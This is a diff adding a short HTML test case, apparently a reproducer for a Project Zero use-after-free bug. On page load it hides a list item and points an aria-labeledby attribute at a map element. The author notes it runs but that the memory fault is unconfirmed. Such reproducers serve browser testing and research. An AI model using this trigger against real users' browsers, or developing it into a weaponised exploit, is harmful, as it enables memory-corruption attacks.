@@ -1,0 +1,16 @@
+<!--Tested on 5.5.1-->
+<!--Bug tested: https://bugs.chromium.org/p/project-zero/issues/detail?id=1249-->
+<!--Result: Runs, unsure of how to confirm UAF-->
+
+<script>
+function go() {
+  li.hidden = true;
+  dir.setAttribute("aria-labeledby", "map");
+  alert("test");
+}
+</script>
+<body onload=go()>
+<dir id="dir">
+<li id="li">
+<map id="map">
+<area></area>
